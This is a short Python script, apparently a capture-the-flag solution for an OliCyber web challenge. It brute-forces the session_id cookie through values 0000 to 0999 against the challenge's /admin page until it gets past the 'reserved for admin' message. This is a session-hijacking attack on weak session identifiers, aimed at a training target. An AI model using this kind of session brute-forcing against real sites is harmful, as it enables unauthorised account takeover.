import requests

url ='http://too-small-reminder.challs.olicyber.it/admin'
data = {
    "username":"cacacaca",
    "password":"cacacaca"
}


for i in range(0,1000):
    id=str(i).zfill(4)
    cookies ={ "session_id": f'{id}'}
    print(f"Provando {id}")
    r = requests.get(url=url,cookies=cookies)
    if "riservata all'admin!" not in r.text :
        print(r.text)
        break


